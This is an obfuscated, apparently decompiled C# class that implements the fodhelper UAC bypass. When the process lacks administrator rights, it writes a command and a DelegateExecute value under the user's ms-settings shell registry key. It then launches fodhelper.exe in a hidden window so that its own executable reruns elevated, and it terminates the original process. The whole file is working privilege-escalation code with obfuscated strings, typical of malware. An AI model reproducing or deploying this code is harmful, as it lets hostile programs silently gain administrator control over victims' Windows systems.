using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;
using Microsoft.Win32;

namespace C3904355907;

internal class C1466425173
{
	private const string m_C3554254475 = "DelegateExecute";

	private const string m_C3904355907 = "C:\\Windows\\System32\\fodhelper.exe";

	private const string C1255198513 = "Software\\Classes\\ms-settings\\shell\\open\\command";

	public static bool C3554254475()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	private static void C3554254475(string string_0)
	{
		try
		{
			C4067256894.C1255198513(0, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ib(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iC(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
			C4067256894.C1255198513(0, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ib(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz(), string_0);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static bool C3904355907()
	{
		if (C3554254475())
		{
			return true;
		}
		try
		{
			C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ic() + Assembly.GetEntryAssembly()!.Location + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ah());
			Registry.CurrentUser.CreateSubKey(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ib());
			Registry.CurrentUser.CreateSubKey(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ib()).SetValue(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iD(), RegistryValueKind.String);
			Registry.CurrentUser.CreateSubKey(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ib()).SetValue(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iC(), 0, RegistryValueKind.DWord);
			Registry.CurrentUser.Close();
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.id();
			processStartInfo.Arguments = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iE() + Assembly.GetExecutingAssembly().Location;
			process.StartInfo = processStartInfo;
			process.Start();
			Process.GetCurrentProcess().Kill();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			Environment.Exit(1);
		}
		return false;
	}
}
